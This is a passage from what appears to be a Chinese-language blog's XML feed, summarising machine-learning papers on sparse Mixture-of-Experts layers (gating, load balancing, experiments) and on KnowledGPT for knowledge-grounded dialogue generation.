<h3 id="插入哨兵标记">插入哨兵标记</h3>
<p>结果如下图所示。不能提高泛化能力，但哨兵标记可以加速训练收敛。</p>
<p><img src="sentinel.png"></p>
<h2 id="设计指南">设计指南</h2>
<p>如何设计一个稀疏模型？专家数量、路由算法、容量系数如何决定？如何根据硬件调整？论文对此给出了建议。</p>
<ul>
<li>专家数量：建议每个 GPU 核心配备一名专家或更少，避免同核心专家数过多导致增多内存传输，降低效率。</li>
<li>容量因子和路由策略（Top-n）：越大性能越好，但计算、通信成本都会增加。论文中平衡训练速度和性能，选择 1.25 的 CF。</li>
</ul>
<p>详细的结果可以参考论文原文。</p>
<h2 id="实验结果">实验结果</h2>
<p>论文设计了一个 T5-Large 近似 FLOP 的 269B 的稀疏模型，在多个 NLP 任务中实现了 SOTA，包括情感分析（SST-2）、语义消歧（WIC）、句子相似度（MRPC、STS-B、QQP）等。</p>
<p>实验结果如下表所示，大部分都是 SOTA。值得注意的是，为简单起见，论文是在所有任务上联合微调的，而非单独微调。如果是单独微调效果可能会更好。</p>
<p><img src="exper-result.png"></p>
<h2 id="总结">总结</h2>
<p>本文针对稀疏专家网络训练的稳定性、质量等问题，做了多因素的定量实验，为相关实践提供了一份指南。</p>
<h2 id="参考">参考</h2>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>条件计算</category>
      </categories>
      <tags>
        <tag>MoE</tag>
        <tag>专家网络</tag>
      </tags>
  </entry>
  <entry>
    <title>MoE：通过条件计算增加模型容量</title>
    <url>/blog/2022/06/05/MoE/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>今天来读一篇关于条件计算的论文，《<strong>Outrageously Large Neural Networks: The Sparsely-Gated Mixture-of-Experts Layer</strong>》，收录于 2017 年 ICLR。神经网络模型的容量（ capacity），例如模型从语料中学习的知识，受限于模型的参数规模。通常，每个样本都要经历到模型所有参数的计算中。增加模型容量意味着成比例的计算性能下降。本文提出了一种条件计算的方法，对每个样本只激活部分参数，可以在不成比例地增加计算量的情况下显着增加模型容量，实现了超过 1000 倍的容量提升，在大型语言建模和机器翻译基准上，这些模型以更低的计算成本实现了新的 SOTA。</p>
<span id="more"></span>
<p>具体而言，论文引入了稀疏门控混合专家层（MoE，Sparsely-Gated Mixture-of-Experts Layer），由前馈神经网络和门控网络组成。门控网络用于选择专家的稀疏组合，处理每个输入。网络的所有部分都通过反向传播联合训练。</p>
<h2 id="介绍">介绍</h2>
<p>正如前文所说，模型的容量受限于参数规模，简单扩大参数会导致训练成本大致呈二次增长。条件计算基于每个样本选择网络的不同部分激活。用于选择的门控决策可以是二元的、稀疏的、连续的、随机的或确定的。各种形式的强化学习和反向传播策略可用于训练门控决策。然而，该方法面临很多的挑战：</p>
<ul>
<li><strong>分支低效</strong>：计算设备，尤其 GPU，计算要比分支快得多。熟悉流水线 CPU 的同学应该知道，分支的分支错误惩罚会导致数个时钟周期的停顿，严重影响计算效率</li>
<li><strong>批大小受限</strong>：条件计算减少了网络条件活动块的 batch size</li>
<li><strong> 网络带宽（IO）受限</strong>：GPU 的计算能力往往是网络带宽的数千倍，嵌入层，也可以看做一种条件计算，往往需要网络发送，这种参数交互受到网络带宽而非计算能力的限制</li>
<li><strong>额外损失项</strong>：可能需要额外的损失项控制每个样本的网络稀疏程度，在模型负载和质量间做出平衡。</li>
<li><strong>大规模数据的依赖</strong>。模型容量的扩大需要大规模数据集训练，现有的一些条件计算工作只使用了最多 60w 数据，难以为万亿计参数的模型提供足够的监督信号。</li>
</ul>
<p>论文提出的稀疏门控专家层 MoE，由许多专家组成，每个专家都是一个简单的前馈神经网络，以及一个可训练的门控网络，该网络选择专家的稀疏组合来处理每个输入。结构图示意如下，其中门控网络从中选择了两个，处理样本。</p>
<p><img src="architecture.png"></p>
<p>虽然技术是通用的，但论文主要关注在语言模型、机器翻译任务上，这些任务可以从模型规模受益。基于此，论文在堆叠的 LSTM 层上应用了一个 MoE 卷积，如上图所示。对文本的不同位置调用一次 MoE，选择不同的专家组合。不同的专家组合根据语法和语义变得高度专业化。</p>
<h2 id="moe结构">MoE 结构</h2>
<p>MoE 由一个门控网络<span class="math inline"> \(G\)</span>、n 个专家网络<span class="math inline"> \(E_1,E_2,\dots,E_n\)</span> 组成。门控网络的输出是一个<span class="math inline"> \(n\)</span> 维的向量。每个专家都是一个前馈网络，输入和输出的维度一致。用<span class="math inline"> \(G(x),E_i(x)\)</span> 分别代表门控网络、第 i 个专家网络的输出，<span class="math inline">\(x\)</span> 为专家网络的输入。MoE 的输出为专家网络输出的加权和，权重为门控网络对应维度的元素值，公式如下： <span class="math display">\[
y=\sum_{i=1}^nG(x)_iE_i(x)
\]</span> 稀疏性体现在<span class="math inline"> \(G(x)\)</span> 上，如果<span class="math inline"> \(G(x)_i\)</span> 为 0，就不需要计算<span class="math inline"> \(E_i(x)\)</span> 了。在实验中，有上千个专家网络，但是只需要计算少部分。如果专家的数量过多，可以通过分层 MoE 减少分支。分层 MoE 中，每个专家都是带有自己门控网络的二级专家组合。下面介绍稀疏门控是如何实现的。</p>
<h3 id="softmax-门控">Softmax 门控</h3>
<p>简单的非稀疏门控可以通过 Softmax 函数实现，公式如下： <span class="math display">\[
G_\sigma(x)=Softmax(x\cdot W_g)
\]</span></p>
<h3 id="噪声top-k门控">噪声 Top-k 门控</h3>
<p>在 Softmax 门控网络中，添加稀疏性可提高计算效率，添加噪声可以实现负载均衡，随机性使得每个专家都有激活的机会。具体是通过在取 Softmax 函数前，添加可调高斯噪声，然后只保留前 k 个值，其余置<span class="math inline"> \(-\infty\)</span>，在进行 Softmax 后，对应的门控信号就为 0,。可调高斯噪声，是指标准正态分布的噪声乘以可训练的噪声权重<span class="math inline"> \(Softplus(x\cdot W_{noise})\)</span>。公式如下： <span class="math display">\[
G(x)=Softmax(KeepTopK(H(x),k))
\]</span> <span class="math display">\[
H(x)_i=(x\cdot W_g)_i+StandardNorm()\cdot Softplus((x\cdot W_{noise})_i)
\]</span> <span class="math display">\[
KeepTopK (v,k)_i=\begin {cases}
v_i,\ 如果 v_i 是前 k 大的元素 \\
-\infty,\ 其他
\end {cases}
\]</span></p>
<h3 id="训练门控网络">训练门控网络</h3>
<p>通过简单的反向传播以及模型的其余部分来训练门控网络。如果选择 k &gt; 1，则前 k 个专家的门值相对于门控网络的权重具有非零导数。梯度通过门控网络反向传播到其输入。</p>
<h2 id="解决性能挑战">解决性能挑战</h2>
<h3 id="批大小缩减">批大小缩减</h3>
<p>大的 batch size 对于计算效率是非常重要的，能够减小参数加载和更新的开销。如果门控网络每次只从专家网络中选择 k 个，每个专家对应的 batch size 会小得多，这会使得参数的更新更为低效。虽然这个问题可以通过暴力加大 batch size 缓解，但这又受限于 GPU 的显存限制。</p>
<p>论文提出了以下两种增加 batch size 的技术：</p>
<p><strong>混合数据并行和模型并行</strong>。传统的数据并行分布式训练中，不同设备上的多个模型副本<strong>异步</strong>处理不同 batch 数据，并通过一组参数服务器同步参数。论文提出同步的数据并行策略，不同设备数据同时组合应用于 MoE 层。模型标准层、门控网络都遵循平常的数据并行设置，不同的是，MoE 的每个专家只保留一份共享副本。每个专家都会收到一个组合批次，该批次包含数据并行中与该专家相关的批次。不同的设备上保存着不同的专家子集。所以这是一种混合数据并行和模型并行的方法。模型并行的设置猜测是为了减少显存开销，大量专家的情况下，每个设备上不激活的专家还是很占显存的。</p>
<p><strong>利用卷积性</strong>。MoE 可以类似卷积操作，施加在每层的不同时间步上应用 MoE，相当于增大了 batch size。但对于 RNN 此类网络，其自回归性使得卷积操作无法进行。</p>
<h3 id="网络带宽">网络带宽</h3>
<p>分布式计算中另一个主要的性能问题是网络带宽。网络中，专家的输入和输出通过网络发送。为了保持计算效率，专家的计算量与其 IO（输入和输出）的比值必须超过计算设备的计算量与网络容量的比值。对于 GPU，这可能是数千比一。实验中，专家是仅有一个隐藏层的感知机，权重矩阵的大小为 input_size×hidden_size 和 hidden_size×output_size，因此计算与输入和输出的比率等于隐藏层的大小。因此，可以简单地通过使用更大的隐藏层或更多隐藏层来提高计算效率。</p>
<p>其实，也很容易理解，增加内部的计算量当然就相对降低了 IO 开销。</p>
<h2 id="平衡专家利用率">平衡专家利用率</h2>
<p>根据论文观察结果，门控网络倾向于为特定的少数专家提供较大的权重。事实上，刚开始受到关注的某些专家会训练地更快，从而会更容易被选择，我愿称其为神经网络的马太效应。为了避免这种情况，论文使用了一种软间隔的方法。定义专家的重要性为 batch 数据中在该专家上的门控值之和。额外损失项<span class="math inline"> \(L_{importance}\)</span>，定义为重要性的变异系数的平方乘以缩放系数<span class="math inline"> \(w_{impotance}\)</span>。公式如下： <span class="math display">\[
Importance(X)=\sum_{x\in X}G(x)
\]</span></p>
<p><span class="math display">\[
L_{importance}(X)=w_{importance}\cdot CV(Importance(X))^2
\]</span> 变异系数（coefficient of variation，CV），定义为标准差和平均值之比，是概率分布离散程度的归一化度量。当有多个变量进行离散程度比较时，标准差会受到量纲的影响，而变异系数可以消除这种影响。上述损失类似 L2 正则项，倾向于让专家有相同的重要性，但是，专家收到的样本数量可能不同，例如一位专家收到少而权重大的数据，另一个专家收到多而权重小的数据。这会导致分布式硬件出现内存、性能的问题。</p>
<p>为解决上述问题，论文还引入了一个损失<span class="math inline"> \(L_{load}\)</span>。公式如下： <span class="math display">\[
P(x,i)=\Phi(\frac{(x\cdot W_g)_i-kth\_excluding(H(x),k,i)}{Softplus((x\cdot W_{noise})_i)})
\]</span></p>
<p><span class="math display">\[
Load(X)_i=\sum_{x\in X}P(x,i)
\]</span></p>
<p><span class="math display">\[
L_{load}(X)=w_{load}\cdot CV(Load(X))^2
\]</span></p>
<p>其中，<span class="math inline">\(P(x,i)\)</span> 定义为<span class="math inline"> \(G(x)_i\)</span> 不为 0 的概率，<span class="math inline">\(kth_excluding(H(x),k,i)\)</span> 为除了第<span class="math inline"> \(i\)</span> 个元素外，<span class="math inline">\(H(x)\)</span> 中最大的第<span class="math inline"> \(k\)</span> 个元素的值，<span class="math inline">\(\Phi\)</span> 为标准正态分布的概率分布函数。</p>
<p><span class="math inline">\(L_{load}\)</span> 粗看可能较难理解，将其转化为下式，其中<span class="math inline"> \((x\cdot W_g)_{a_k}\)</span> 为第 k 大的门控值。可以看出，上式来自<span class="math inline"> \(H(x)\)</span> 的计算，<span class="math inline">\(H(x)\)</span> 中添加了高斯噪声平滑项，<span class="math inline">\(P(x,i)\)</span> 实际计算得到的是专家<span class="math inline"> \(i\)</span> 和被选中的权值最小的专家（第 k 个）门控值间的差异，并引入高斯噪声，通过标准正态的 CDF 映射得到选中第<span class="math inline"> \(i\)</span> 专家的概率。再通过变异系数计算损失，与<span class="math inline"> \(L_{importance}\)</span> 类似。 <span class="math display">\[
P(x,i)=\Phi(\frac{(x\cdot W_g)_i-(x\cdot W_g)_{a_k}}{Softplus((x\cdot W_{noise})_i)}-\epsilon)
\]</span></p>
<h2 id="实验">实验</h2>
<h3 id="亿级语言模型">亿级语言模型</h3>
<ul>
<li>数据集：约 8.29 亿 token 的新闻语料，词表约 80w</li>
<li> 先前 SOTA：若干个堆叠的 LSTM 网络组成，参数从 200w 到 1.51 亿</li>
<li>本文模型：两层 LSTM 堆叠，中间有一个 MoE 层，MoE 层的大小、专家数量有所不同（4-4096）。每个专家约 100w 参数，选择的专家数 k=4</li>
</ul>
<p>为了研究增加容量的效果，论文训练了一系列 MoE 模型，并控制它们的计算成本（约时间步每 800w 次加乘操作，该指标记作 ops/timestap）。</p>
<p>下图展示了该任务上 LSTM 和 MoE 的比较结果。左侧图展示了同样计算成本下，模型的困惑度与参数的关系。基线 LSTM 模型只存在图左上方，少参数而高困惑度。展平的 MoE 与分层 MoE 能在同样参数规模下，获得更低的困惑度。右图为 40 亿参数下，困惑度与计算成本的关系。</p>
<p><img src="comparison.png"></p>
<p>下表展示了详细的对比结果，高计算成本的 MoE 能够显著降低困惑度。要注意的是，虽然 MoE 参数最多 30 倍于基础模型，但是每个样本只有 4 个专家处于激活态，这使得模型间的实际激活的参数、计算性能是可比的。</p>
<p><img src="table-comparison.png"></p>
<h3 id="千亿谷歌语料">千亿谷歌语料</h3>
<p>与上述实验配置、结果相似。不过随着 MoE 层中的参数数量超过 10 亿，增加额外容量似乎会产生递减收益，</p>
<p><img src="google.png"></p>
<h3 id="单语对机器翻译">单语对机器翻译</h3>
<p>WMT'14 翻译数据集，以英法翻译结果为例。此任务使用的模型是 GNMT 模型的修改版本。为了减少计算量，模型的编码器和解码器中的 LSTM 层数分别从 9 层和 8 层减少到 3 层和 2 层。论文在编码器（第 2 层和第 3 层之间）和解码器（第 1 层和第 2 层之间）中都插入了 MoE 层。每个 MoE 层包含多达 2048 位专家，每个专家大约有 200 万个参数，总共为模型添加了大约 80 亿个参数。</p>
<p><img src="en-fr-translation.png"></p>
<h3 id="多语对翻译">多语对翻译</h3>
<p>传统方法，使用同一模型进行多语翻译的性能，要差于训练多个模型分别处理单语对翻译。这是由于多个模型提供了更大的模型容量。论文用单一的 MoE 重复了这个实验。MoE 模型在开发集比多语言 GNMT 模型。在 BLEU 得分上，MoE 模型在 12 个语言对中的 11 个上显着击败了多语言 GNMT 模型（高达 5.84 分），甚至在 12 个语言对中的 8 个上击败了单语 GNMT 模型。</p>
<p><img src="multi-translation.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文提出了一种条件计算的方法，并解决了其在实践中遇到的种种挑战（负载均衡、分布式性能等）。在语言模型、机器翻译任务上，证实了其提升模型容量同时保证计算性能的能力。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zh.m.wikipedia.org/zh-sg/变异系数">变异系数 - 维基百科，自由的百科全书 (wikipedia.org)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>条件计算</category>
      </categories>
      <tags>
        <tag>条件计算</tag>
        <tag>门控</tag>
        <tag>MoE</tag>
      </tags>
  </entry>
  <entry>
    <title>KnowledGPT: 基于预训练语言模型的知识对话</title>
    <url>/blog/2022/05/03/KnowledGPT/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>《Knowledge-Grounded Dialogue Generation with Pre-trained Language Models》是由北大发表的论文，旨在通过预训练的语言模型进行知识对话，论文收录于 EMNLP 2020 主会。代码公开在 <a href="https://github.com/zhaoxlpku/KnowledGPT">zhaoxlpku/KnowledGPT (github.com)</a>。论文通过在预训练语言模型（如 GPT）外配置知识选择模块，从非结构化的知识文本中选择知识，并通过一种无监督的方法联合优化知识选择和知识对话生成。论文提出的 KnowLEDGPT 在 Wizard 和 CMU DoG 两个数据集上的自动 &amp; 人工评估实现了 SOTA。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>数据驱动的开放域对话系统一直饱受通用性、无用回复的问题。当人类参与者试图深入某个特定主题时，这种缺陷尤其严重。虽然预训练模型通过模型扩张、更多的数据改善了这一问题，其可以在训练期间记住足够多的语言模式，但它们仍只能捕获 “平均语义”。当对话需要知识才能进行下去时，除非模型已经在预训练阶段 “见过” 相关知识并以正确的方式存储在参数中且可以正确关联，否则模型生成的回复仍可能是通用无用的。这与人类的真实对话还有着不小的差距。</p>
<p>最近，出现了两条似乎有望弥合差距的研究方向。第一种是大规模的预训练模型，通过模型扩张、大量数据在预训练期间学到足够多的语言模式，缓解通用性回复的问题。然而，这种简单粗暴的方法还是只能捕获数据的 “平均” 语义。当需要特定知识时，生成的回复仍然可能是通用的。</p>
<p>另一种方法是显式地引入外部知识。知识可分为结构化的知识图谱和非结构化的文本（维基百科等）。由于高质量的知识图谱更难获得，而非结构化的文本则更易获得，成本低廉而且数量庞大。然而，这些文本往往长而冗余，而预训练模型往往会受到序列长度的限制。事实上，该问题上，模型容量和处理长输入的能力是冲突的。一方面，在海量的文本上预训练，模型必须设置一个输入上限。另一方面，在回复生成时，需要尽可能多的保留候选知识，以保证相关知识的召回。这一冲突是知识对话生成的基本阻碍。</p>
<p>为了克服这一问题，研究者开始引入知识选择模块，从若干相关知识候选中选择最相关的知识子集，进而显著序列长度。然而，现在的一些方法中，知识选择模块要么与模型强耦合，无法应用在预训练模型中；要么通过人工标注数据训练，成本昂贵。本文提出了一种无监督的方法，将知识选择形式化为基于 BERT 的序列预测任务。通过计算真实回复和候选知识间的相似度作为伪标签，预热模型。再通过强化学习、课程学习的方法，交替更新知识选择模型和回复生成模型。因此，知识选择通过回复生成的反馈得到进一步优化。</p>
<p>论文在 Wizard of Wikipedia 和 CMU Document Grounded Conversations 两个数据集上进行实验。结果表明，模型可以显着优于最先进的方法以及一些以启发式方式使用的预训练模型，达到新的 SOTA。此外，作为副产品，知识选择模块在维基百科向导上的知识选择准确性方面也优于最先进的模型，这意味着其他模型也可以从该组件中受益。</p>
<h2 id="问题定义">问题定义</h2>
<ul>
<li>数据集<span class="math inline"> \(D=\{(U_i,D_i,r_i)\}_{i=1}^N\)</span></li>
<li><span class="math inline">\(U_i\)</span> 代表上下文</li>
<li><span class="math inline"> \(D_i\)</span> 代表与<span class="math inline"> \(U_i\)</span> 相关的文档</li>
<li><span class="math inline"> \(r_i\)</span> 代表给定<span class="math inline"> \(U_i\)</span> 上下文，基于<span class="math inline"> \(D_i\)</span> 的回复</li>
<li>目标：<span class="math inline">\(\max P(r_i|U_i,D_i;\theta)\)</span></li>
</ul>
<p>由于论文使用 GPT2 建模此条件概率，因此将上式改写为： <span class="math display">\[
\begin{aligned}
P(r_i|U_i,D_i)&amp;=P(r_i|g(U,D);\theta)\\
&amp;=\prod_i^{l_r}P(r_i|g(U,D),r_{1:t-1};\theta)
\end{aligned}
\]</span> <span class="math inline">\(g(U,D)\)</span> 将知识和上下文结合的模块，包含知识选择。问题就变成了如何定义<span class="math inline"> \(g(U,D)\)</span> 和如何微调<span class="math inline"> \(\theta\)</span>。显然，可以直接将<span class="math inline"> \(D\)</span> 和<span class="math inline"> \(U\)</span> 直接拼接在一起然后截断，但是这可能会删去重要的知识且引入噪声，进而影响性能。<span class="math inline">\(g(U,D)\)</span> 的学习面临以下问题：</p>
<ul>
<li>如何对<strong>上下文与外部知识之间的相关性</strong>进行建模</li>
<li>当<strong>缺少真实知识标签时</strong>如何学习<span class="math inline"> \(g(U,D)\)</span></li>
<li> 如何将<span class="math inline"> \(g(U,D)\)</span> 和 GPT-2 模型与 D <strong>联合优化</strong>，从而使两者相互促进。</li>
</ul>
<h2 id="方法">方法</h2>
<p>模型的架构如下图所示。在 Transformer 架构的基础上，知识选择模块由上下文感知<strong>知识编码器</strong>和<strong>顺序知识选择器</strong>组成。知识编码器通过自注意力层捕获上下文 U 和 D 中的每个句子之间的交互模式，然后将这些模式馈送到知识选择器，逐步地解码有用的知识。由于无法获得人工标记，学习方法从充分利用回复构建的伪标记开始，通过强化学习方法和课程学习方法交替优化知识选择和回复生成。</p>
<p><img src="architecture.png"></p>
<h3 id="上下文感知知识编码器">上下文感知知识编码器</h3>
<p>虽然名字很玄乎，但是原理很简单。将上下文<span class="math inline"> \(U_i\)</span> 和每个候选知识<span class="math inline"> \(d_i\in D_i=(d_1,d_2,\cdots,d_m)\)</span> 分别拼接起来，馈入 BERT，取最后一层的 <strong>[CLS]</strong> 的向量作为上下文表征。也就是架构图左侧的下半部分。用<span class="math inline"> \(E=(e_1,e_2,\cdots,e_m)\)</span> 代表编码器的输出，其中<span class="math inline"> \(e_i\)</span> 代表知识<span class="math inline"> \(d_i\)</span> 和上下文拼接后的上下文表征。</p>
<h3 id="顺序知识选择器">顺序知识选择器</h3>
<p>这里的原理也很简单。前面提到，论文将知识选择视作<strong>序列预测</strong>任务（而非序列分类）。换而言之，知识选择模块意在<strong>顺序地解码出一个知识序列子集</strong>。也就是类似 RNN 的自回归方法。这样建模的原因可能是无需额外考虑序列分类时拼接的顺序。</p>
<p>具体而言，这一块有一个 LSTM 解码器组成，输入为编码器的输出序列<span class="math inline"> \(E\)</span>。解码每一步与输入序列计算 Attention，从知识表征中选择输出，直到输出特殊的结束符号<span class="math inline"> \(e_{spe}\)</span> 或者序列长度达到上限。另外，在解码时的每一步，需要排除已经输出的知识，显然同一个知识没有必要输出两次。最后得到的解码输出就是选择后的知识序列<span class="math inline"> \(D'\)</span>，<span class="math inline">\(g(U,D)\)</span> 定义为<span class="math inline"> \(U\cup D'\)</span>。</p>
<h3 id="学习策略">学习策略</h3>
<p>由于知识选择器的训练过程是无标签的，这可能会很困难。在最近的一篇论文中（Kim et al., 2020），当人类标签被移除时，知识选择的准确率从 27% 下降到 0.3%。另外，在端到端的模型中，知识选择的结果作为回复生成的输入，二者耦合纠缠。在训练早期，<span class="math inline">\(g(U,D)\)</span> 可能性能很差，训练噪声传入 GPT-2 再反向传播至<span class="math inline"> \(g(U,D)\)</span>，可能会导致两边模型效果都很差。因此，论文提出了一种弱监督的联合优化策略，如下所示。</p>
<h4 id="伪标签构建">伪标签构建</h4>
<p>为了减轻联合优化中的错误累积，论文考虑构建弱监督信号并预热 g (U, D) 的学习和 GPT-2 的微调。 直觉来看，人类的回复带有与知识候选相关性的线索，因此可以用来构建伪标签。具体来说，首先根据相似性<span class="math inline"> \(\{Sim(d_t, r)\}_{t=1}^m\)</span> 将<span class="math inline"> \(D=\{d_t\}_{t=1}^m\)</span> 降序排序为<span class="math inline"> \(\{d_{j_t}\}^m_{t=1}\)</span>。其中 $Sim (・,・) $ 表示<strong>相似度函数</strong>，例如 uni-gran F1。 然后构建 D 的子集： <span class="math display">\[
\overline D=\{d_{j_1},d_{j_2},\cdots,d_{j_\overline m}\}
\]</span></p>
<p><span class="math display">\[
\overline m=\arg\max_t(Sim(d_{j_{1:t}},r))
\]</span> 其中，<span class="math inline">\(d_{j_{1:t}}\)</span> 是<span class="math inline"> \(\{d_{j_i}\}_{i=1}^t\)</span> 的拼接结果。上述子集的构建就是取相似性降序知识的前缀拼接结果中，与真实回复相似性最大的拼接结果对应的知识子集。然后以<span class="math inline"> \(\overline D\)</span> 为知识选择的伪标签，分别<strong>预热</strong>知识选择模块和回复生成模块。即，通过最大似然分别优化<span class="math inline"> \(D_K=\{(U_i,D_i,\overline D_i\}_{i=1}^N\)</span> 和<span class="math inline"> \(D_G=\{(U_i,\overline D_i,r_i\}_{i=1}^N\)</span>。</p>
<h4 id="联合优化">联合优化</h4>
<p><strong>强化学习</strong>。论文使用策略梯度法继续训练<span class="math inline"> \(g(U,D)\)</span>。其中，<span class="math inline">\(g(U,D)\)</span> 由 GPT-2 进一步监督且直接针对目标指标进行优化（例如实验中的 F1）。具体而言，在知识选择器解码时的每一步，从概率分布<span class="math inline"> \(P(d_i|U,d_{1:t-1})\)</span> 中采样另一个知识，遵循同样的停止策略，定义如下的损失函数： <span class="math display">\[
\mathcal L_K=-\frac 1 N\sum_{i=1}^N(\tilde R_i \sum_{t=1}^{|\tilde D_i|}logP(d_{i,j_t}|U_i,d_{i,j_{1:t-1}}))
\]</span></p>
<p><span class="math display">\[
\tilde R_i=R(\tilde D_i)-b
\]</span> 其中，<span class="math inline">\(R(\tilde D_i)=Sim(r'_i,r_i)\)</span>，<span class="math inline">\(r_i'\)</span> 是 GPT-2 利用<span class="math inline"> \(U_i,\tilde D_i\)</span> 生成的回复，<span class="math inline">\(b=\sum_{i=1}^N R(\tilde D_i)/N\)</span> 是基线用以减小梯度估计的方差。可以看到，如果获得比基线更高的奖励，即<span class="math inline"> \(R(\tilde D_i)&gt;0\)</span>，则最小化 <span class="math inline">\(\mathcal L_K\)</span> 等效于最大化<span class="math inline"> \(\tilde D_i\)</span> 的条件似然。</p>
<p><strong>课程学习</strong>。虽然模型已经在伪标签上进行过预热， 但是在训练之初，<span class="math inline">\(D'\)</span> 可能还是差于<span class="math inline"> \(\overline D\)</span>。因此，论文将<span class="math inline"> \(D',\overline D\)</span> 混合，使用课程学习策略微调。具体来说，是设置一个超参数<span class="math inline"> \(p\)</span>，控制从两者间采样<span class="math inline"> \(D\)</span> 作为回复生成模块的输入的概率，并随着训练过程调整<span class="math inline"> \(p\)</span> 的大小，完成从<span class="math inline"> \(\overline D\)</span> 到<span class="math inline"> \(D\)</span> 的迁移。</p>
<h2 id="实验">实验</h2>
<h3 id="数据集指标">数据集 &amp; 指标</h3>
<p>论文在 Wizard of Wikipedia 和 CMU Document Grounded Conversations 两个数据集上进行实验。这两个数据集都是在 Amazon Mechanical Turk 上通过众包构建的，使用 Wikipedia 作为知识库，并由数据所有者分为训练集、验证集和测试集。Wizard 中的数据主题涵盖范围很广（1365 个），每次对话都发生在有权访问特定主题知识的向导和渴望从向导学习该主题的学徒之间。测试集分为两个子集：Test Seen 和 Test Unseen。 Test Seen 包含新的对话，主题出现在训练集中，而 Test Unseen 中的主题从未出现在训练集和验证集中。与 Wizard 不同，CMU DoG 专注于电影领域，除了向导 - 学徒间的对话，数据还包含两个了解文档并试图深入讨论内容的用户之间的对话。</p>
<p>自动评估指标：真实回复的困惑度 (PPL)、BOW Embedding 和 unigram F1 作为指标。</p>
<p>人工评估：3 位注释者从流畅度、上下文连贯性和知识相关性三个方面判断回复的质量，并在 {0,1,2}（代表 “坏”、“一般” 和 “好”）中分配一个分数。</p>
<h3 id="基线">基线</h3>
<ul>
<li>Transformer Memory Network (TMN): Wizard 数据集论文中提出的模型。</li>
<li>Incremental Transformer with Deliberation Decoder (ITDD): 对多轮对话和知识进行增量编码，并使用 Deliberation 技术解码响应。</li>
<li>Sequential Knowledge Transformer (SKT): 在最近的一篇论文中发表的具有最佳知识选择性能的顺序潜变量模型，作为 Wizard 数据的基线。</li>
<li>Disentangled Response Decoder (DRD): 通过预训练技术解决低资源挑战的模型。论文选择在预训练后使用完整训练数据对所有参数进行微调的一个版本作为基线，因为这样的配置会产生最好的性能。</li>
</ul>
<p>论文提出的模型名为 KnowledGPT。除了上述基线，为了验证提出的方法，论文对下面两个模型也进行实验比较：</p>
<ul>
<li><span class="math inline">\(GPT-2_{trunc}\)</span>：将上下文和相关知识连接成一个长输入，然后截断该输入以满足 GPT-2 模型的长度约束。这是为了检查简单的启发式方法是否适用于该任务。</li>
<li>SKT+GPT-2：我们将 SKT 选择的候选知识提供给 GPT-2 以生成回复。这是为了检查是否可以简单地用现成的知识选择模型替换知识选择模块。</li>
</ul>
<h3 id="实验结果">实验结果</h3>
<p>下两表分别展示了 Wizard 和 CMU DoG 的实验结果。 KnowledGPT 在两个数据集中的大多数指标上都达到了新的最先进水平，这证明了本文提出方法的有效性。 <span class="math inline">\(GPT-2_{trunc}\)</span> 比 KnowledGPT 差，原因是：</p>
<ul>
<li><strong>知识损失</strong>：论文发现在 53% 的测试示例（Test Seen+Test Unseen）中，真实知识被移除了。 在这种情况下，GPT-2 只依赖于上下文、其他候选者中的相关知识（由于上下文和知识之间的一对多关系）以及包装在 GPT-2 参数中的知识进行响应，这 解释了 SKT 和 DRD 的可比性能。</li>
<li><strong>噪声输入</strong>：即使保留了真实知识，候选知识中的冗余和不相关信息仍然是有害的。</li>
</ul>
<p>KnowledGPT 在 Wizard 上的表现也优于 SKT+GPT-2，因为</p>
<ul>
<li>KnowledGPT 在知识选择上比 SKT 更准确，尽管它在学习中没有利用任何人工注释。事实上，SKT 在 Test Seen 和 Test Unseen 上知识选择的准确率分别为 26.8 和 18.3，而 KnowledGPT 这两个数字分别为 28.0 和 25.4</li>
<li> 在 KnowledGPT 中，知识选择和响应生成是联合优化的。</li>
</ul>
<p><img src="wizard-result.png"></p>
<p><img src="CMU-result.png"></p>
<p>下表展示了人工评估结果。虽然这三个模型在流畅度上具有可比性，但 KnowledGPT 在上下文连贯性和知识相关性方面都优于其他模型，这与自动指标的结果一致。</p>
<p><img src="human-evaluation.png"></p>
<h4 id="消融实验">消融实验</h4>
<p>为了了解学习策略对模型性能的影响，论文将完整的 KnowledGPT 与以下变体进行了比较：</p>
<ol type="1">
<li><strong>-pseudo</strong>：移除预热阶段</li>
<li><strong> -joint</strong>：移除联合优化阶段</li>
<li><strong> -reinforcement</strong>：g (U, D) 在<span class="math inline"> \(D_K\)</span> 上用 MLE 优化后固定</li>
<li><strong> -curriculum</strong>：GPT-2 在<span class="math inline"> \(D_G\)</span> 上用 MLE 优化后固定</li>
</ol>
<p>实验结果如下表所示。</p>
<p><img src="ablation-study.png"></p>
<p>可以得到以下结论：</p>
<ul>
<li><strong>伪标签预热对 Wizard 数据集很重要</strong>，移除后性能急速下降。这是因为在 Wizard 中，知识与人类反应之间存在很强的相关性。结果表明，尽管伪标签是用启发式方法构建的，但它仍然包含有价值的信息，允许联合优化从一个好的点开始。</li>
<li><strong>强化步骤和课程步骤是有用的</strong>。因为强化步骤允许知识选择模块更好地利用 GPT-2 的反馈，并且通过课程步骤 GPT-2 可以逐步利用知识选择模块的输出。</li>
<li><strong>联合优化是有意义的</strong>。去掉这个阶段会导致性能下降。</li>
</ul>
<p>此外，论文还对知识选择数量的上限<span class="math inline"> \(T_{max}\)</span> 做了实验。结果如下表。<span class="math inline">\(T_{max}\)</span> 越大，KnowledGPT 越有可能将真实候选知识纳入生成，PPL 越低。这也解释了为什么<span class="math inline"> \(GPT-2_{trunc}\)</span> 的 PPL 低于 KnowledGPT。另一方面，较大的 <span class="math inline">\(T_{max}\)</span> 也意味着生成的噪声更多。这就是为什么当 <span class="math inline">\(T_{max}\)</span> 超过一个值时，F1 开始下降。</p>
<p><img src="T-max.png"></p>
<h2 id="总结">总结</h2>
<p>论文将大规模的预训练语言模型应用于知识对话生成任务。为此，论文设计了一个知识选择模块，并提出了一种无监督方法来联合优化知识选择和响应生成。两个基准的评估结果表明，论文提出 KnowledGPT 模型实现了新的 SOTA。</p>
<p>这篇论文提出的联合优化策略，包括伪标签的构建、强化学习和课程学习，都让我眼前一亮。感觉还是蛮有启发性的工作。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
        <category>知识对话</category>
